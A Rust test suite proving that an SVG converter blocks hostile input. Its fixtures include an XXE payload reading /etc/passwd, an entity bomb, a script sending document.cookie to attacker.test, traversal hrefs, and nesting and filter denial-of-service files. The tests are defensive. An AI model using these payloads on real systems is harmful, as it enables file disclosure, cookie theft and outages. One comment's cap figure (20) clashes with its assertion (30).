//! What an SVG from a stranger may not do.
//!
//! The node converts SVG nobody on this platform wrote: a model's answer, a
//! member's upload, a template carried in a project bundle. Each test here
//! is one thing such a file must not achieve, and the mechanism that stops
//! it. A test that starts failing is a hole, not a style change.
//!
//! The four layers, outermost first:
//!
//! 1. **No XML entity is ever declared.** A `<!DOCTYPE>` carrying an
//!    internal subset — the only place an entity can be declared — is
//!    refused by name; the plain SVG 1.1 doctype a drawing program writes
//!    is cut out, never fetched. So there is no `file:///etc/passwd`
//!    through an external entity and no expansion bomb.
//! 2. **Only the project's own bytes are fetched.** One resolver answers
//!    every `href`, from a cache filled before the render; a URL or a
//!    `data:` URI is refused by name, and `resolve_data` answers `None` so
//!    usvg cannot inline one behind our back.
//! 3. **usvg draws, it does not execute.** `<script>` is not JavaScript to a
//!    static renderer, `@import` fetches nothing, `<use>` and `feImage`
//!    reach no host. Each is proven by rendering the file and finding the
//!    rest of the picture intact.
//! 4. **Bounded work.** The source is capped at 512 KB, canvas pixels are
//!    capped before allocation, and nesting is capped at
//!    [`MAX_DEPTH`](super::MAX_DEPTH) because every walker over the tree —
//!    usvg's, resvg's, the layout report's and the tree's own destructor —
//!    recurses. One input is **not** bounded: an SVG filter can cost
//!    unbounded CPU, so a filter region, a turbulence's octaves, a blur's
//!    deviation and the length of a filter chain are all capped. See
//!    [`limits`](super::limits) for the measurements those caps came from.
//!
//! What these tests do **not** cover, deliberately: the SVG *text* is still
//! dangerous to serve to a browser. Nothing here makes a stored `.svg` safe
//! under `public/`; only the picture this node answers is safe.
//!
//! Colours are written `rgb(r,g,b)` rather than `#rrggbb` so no fixture
//! needs a `"#` inside a raw string.

use std::collections::HashMap;
use std::sync::Arc;

use super::*;

fn fonts() -> FontSet {
    FontSet::bundled()
}

fn empty_resolver() -> Resolver {
    Resolver::new(Arc::new(MemoryStore(HashMap::new())))
}

fn png(svg: &str) -> Result<Rendered, ConvertError> {
    convert(svg, &fonts(), &empty_resolver(), &Target::default(), OutputFormat::Png, 82)
}

/// The centre pixel, to prove the harmless part of a hostile file still drew.
fn centre(r: &Rendered) -> [u8; 4] {
    let img = image::load_from_memory(&r.bytes).unwrap().to_rgba8();
    img.get_pixel(img.width() / 2, img.height() / 2).0
}

#[test]
fn an_external_entity_cannot_read_a_file_and_an_entity_bomb_cannot_expand() {
    // XXE: the classic. If this ever renders, /etc/passwd is in the picture.
    let xxe = r#"<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text x="0" y="50" font-family="Inter">&xxe;</text></svg>"#;
    let err = png(xxe).unwrap_err();
    assert_eq!(err.kind, ConvertErrorKind::Source);
    assert!(err.message.contains("DTD"), "{}", err.message);

    // Billion laughs, small enough to be harmless if it ever did expand.
    let bomb = r#"<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text>&c;</text></svg>"#;
    assert!(png(bomb).unwrap_err().message.contains("DTD"));

    // The rule is precise: a DTD with an *internal subset* is refused,
    // because that is the only place an entity can be declared. The plain
    // SVG 1.1 doctype every drawing program writes declares nothing, so it
    // is cut out and the file converts — otherwise most real templates
    // would be rejected.
    let illustrator = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10" fill="rgb(255,0,0)"/></svg>"#;
    assert_eq!(centre(&png(illustrator).expect("a plain doctype is harmless")), [255, 0, 0, 255]);

    // And the refusal names what to remove, rather than saying "DTD".
    let subset = r#"<!DOCTYPE svg [<!ENTITY a "x">]><svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"/>"#;
    assert!(png(subset).unwrap_err().message.contains("internal DTD subset"));
}

#[test]
fn a_script_a_stylesheet_import_and_a_webfont_are_inert_and_the_picture_still_draws() {
    // usvg renders, it does not execute. The rect is the witness: if the
    // file had been refused there would be no picture at all, and if the
    // script had run it would have reached for a host.
    let hostile = r#"<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
        <script>fetch("http://attacker.test/" + document.cookie)</script>
        <style>@import url("http://attacker.test/x.css"); @font-face { font-family: E; src: url("http://attacker.test/f.ttf"); }</style>
        <a href="javascript:alert(1)"><rect width="100" height="100" fill="rgb(255,0,0)"/></a>
    </svg>"#;
    let out = png(hostile).expect("renders");
    assert_eq!(centre(&out), [255, 0, 0, 255], "the rect drew; the script and the import did not");
}

#[test]
fn every_road_to_a_remote_or_local_file_is_refused_or_answers_nothing() {
    // `<image>`: refused by name at parse time, so the author sees why.
    for href in [
        "http://attacker.test/a.png",
        "https://attacker.test/a.png",
        "//attacker.test/a.png",
        "file:///etc/passwd",
        "data:image/png;base64,iVBORw0KGgo=",
        "../../../etc/passwd",
        "/etc/passwd",
        "zebfs://../../secret.png",
        "repo://pages/home.tsx",
    ] {
        let svg = format!(
            r#"<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><image href="{href}" width="10" height="10"/></svg>"#
        );
        let err = png(&svg).unwrap_err();
        assert_eq!(err.kind, ConvertErrorKind::Source, "{href}");
        assert!(err.message.contains("picture"), "{href}: {}", err.message);
    }

    // `<use>` and `feImage` are not fetched by this node, so they reach the
    // renderer — where the resolver answers nothing for a foreign scheme and
    // `resolve_data` answers None. The picture draws without them.
    let sneaky = r#"<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
        <use href="http://attacker.test/a.svg#x"/>
        <filter id="f"><feImage href="http://attacker.test/a.png"/></filter>
        <rect width="100" height="100" fill="rgb(0,255,0)"/>
    </svg>"#;
    let out = png(sneaky).expect("renders");
    assert_eq!(centre(&out), [0, 255, 0, 255], "the rect drew; nothing was fetched");
}

#[test]
fn a_picture_the_resolver_never_fetched_is_not_drawn_from_anywhere_else() {
    // The render-time resolver answers only from the cache the parse pass
    // filled, so nothing can be smuggled in by a reference the check missed.
    let mut map = HashMap::new();
    map.insert(Source::Store("real.png".into()), test_support::solid_png(4, 4, [0, 0, 255]));
    let resolver = Resolver::new(Arc::new(MemoryStore(map)));
    let svg = r#"<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><image href="real.png" width="20" height="20"/></svg>"#;
    assert!(convert(svg, &fonts(), &resolver, &Target::default(), OutputFormat::Png, 82).is_ok());
    let opt = fonts().options();
    assert!(resolver.image_kind("never-asked-for.png", &opt).is_none());
    assert!(resolver.image_kind("http://attacker.test/a.png", &opt).is_none());
    assert!(resolver.image_kind("file:///etc/passwd", &opt).is_none());
}

#[test]
fn the_work_is_bounded_in_source_size_canvas_and_nesting() {
    let fonts = fonts();
    let resolver = empty_resolver();

    // Source: over the cap, refused before it is parsed.
    let big = format!(
        r#"<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><!--{}--><rect width="10" height="10"/></svg>"#,
        "x".repeat(MAX_SVG_BYTES)
    );
    assert!(png(&big).unwrap_err().message.contains("limit"));

    // Canvas: a request for 64 megapixels is refused before allocation.
    let small = r#"<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10"/></svg>"#;
    let err = convert(small, &fonts, &resolver, &Target { width: Some(8000), height: Some(8000), fit: Fit::Fill }, OutputFormat::Png, 82).unwrap_err();
    assert!(err.message.contains("cap"), "{}", err.message);

    // Nesting: 4000 groups deep overflowed the stack and aborted the whole
    // process before MAX_DEPTH existed — the server, not the node. It must
    // now be refused, by name, and cheaply.
    let deep = format!(
        r#"<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20">{}<rect width="20" height="20" fill="rgb(255,0,0)"/>{}</svg>"#,
        "<g>".repeat(4000),
        "</g>".repeat(4000)
    );
    let started = std::time::Instant::now();
    let err = png(&deep).unwrap_err();
    assert_eq!(err.kind, ConvertErrorKind::Source);
    assert!(err.message.contains("deep"), "{}", err.message);
    assert!(started.elapsed().as_secs() < 5, "refusing deep nesting took {:?}", started.elapsed());

    // An ordinary drawing's nesting is untouched.
    let ordinary = format!(
        r#"<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20">{}<rect width="20" height="20" fill="rgb(255,0,0)"/>{}</svg>"#,
        "<g>".repeat(30),
        "</g>".repeat(30)
    );
    assert_eq!(centre(&png(&ordinary).expect("30 deep is ordinary")), [255, 0, 0, 255]);
}

#[test]
fn a_filter_that_would_run_away_with_the_thread_is_refused_before_it_starts() {
    // Measured before the caps existed: this file cost 45 seconds of one
    // core. The node renders on the calling thread, so that was 45 seconds
    // no engine timeout could reclaim. The region is what dominates — see
    // the table in `limits` — so it is refused, by name, in milliseconds.
    let bomb = r#"<svg xmlns="http://www.w3.org/2000/svg" width="1080" height="1350">
        <filter id="f" x="-100%" y="-100%" width="300%" height="300%">
            <feTurbulence baseFrequency="0.002" numOctaves="8"/>
            <feGaussianBlur stdDeviation="500"/>
        </filter>
        <rect width="1080" height="1350" filter="url(#f)" fill="rgb(255,0,0)"/>
    </svg>"#;
    let started = std::time::Instant::now();
    let err = png(bomb).unwrap_err();
    assert_eq!(err.kind, ConvertErrorKind::Source);
    assert!(err.message.contains("filter #f"), "{}", err.message);
    assert!(started.elapsed().as_millis() < 500, "refusing took {:?}", started.elapsed());
}

#[test]
fn the_most_expensive_filter_still_allowed_stays_within_its_budget() {
    // The budget is a product, so the worst file is the one that spends all
    // of it: the widest region the score still permits, with the heaviest
    // primitives that fit underneath. This is the promise the cap makes.
    //
    // The first version of these caps was four separate limits, and a file
    // obeying every one of them cost 54 seconds — worse than the bomb they
    // were written to stop — because ten cheap primitives over a wide region
    // multiply exactly as well as one expensive primitive. Hence the score.
    let worst = format!(
        r#"<svg xmlns="http://www.w3.org/2000/svg" width="1080" height="1350">
        <filter id="f" x="-50%" y="-50%" width="200%" height="200%">
            <feTurbulence baseFrequency="0.002" numOctaves="{octaves}"/>
            <feOffset dx="1" dy="1"/>
        </filter>
        <rect width="1080" height="1350" filter="url(#f)" fill="rgb(255,0,0)"/>
    </svg>"#,
        octaves = MAX_TURBULENCE_OCTAVES,
    );
    // 200% region is 4x the area, turbulence at 4 octaves plus one offset is
    // 5 units of work: 20, exactly the cap.
    let started = std::time::Instant::now();
    let out = png(&worst).expect("the worst allowed file still renders");
    let took = started.elapsed();
    eprintln!("worst filter still allowed, 1080x1350: {took:?}, {} bytes", out.bytes.len());
    assert!(took.as_secs() < 20, "the worst allowed filter took {took:?}");

    // One unit more is refused, and the refusal explains the arithmetic.
    let over = worst.replace(r#"<feOffset dx="1" dy="1"/>"#, r#"<feOffset dx="1" dy="1"/><feOffset dx="2" dy="2"/>"#);
    let err = png(&over).unwrap_err();
    assert!(err.message.contains("costs about") && err.message.contains("limit is 30"), "{}", err.message);
}

#[test]
fn many_modest_filters_are_bounded_even_though_each_one_passes() {
    // Every filter here is ordinary. Together they are not, because each
    // filtered element pays its filter's price again.
    let one = r#"<filter id="f{i}" x="-50%" y="-50%" width="200%" height="200%"><feGaussianBlur stdDeviation="20"/></filter><rect width="1080" height="1350" filter="url(#f{i})" fill="rgb(0,0,255)"/>"#;
    let mut body = String::new();
    for i in 0..6 {
        body.push_str(&one.replace("{i}", &i.to_string()));
    }
    let many = format!(r#"<svg xmlns="http://www.w3.org/2000/svg" width="1080" height="1350">{body}</svg>"#);
    let err = png(&many).unwrap_err();
    assert!(err.message.contains("together"), "{}", err.message);

    // Two of them is a normal design and still renders.
    let mut body = String::new();
    for i in 0..2 {
        body.push_str(&one.replace("{i}", &i.to_string()));
    }
    let couple = format!(r#"<svg xmlns="http://www.w3.org/2000/svg" width="1080" height="1350">{body}</svg>"#);
    assert!(png(&couple).is_ok());
}
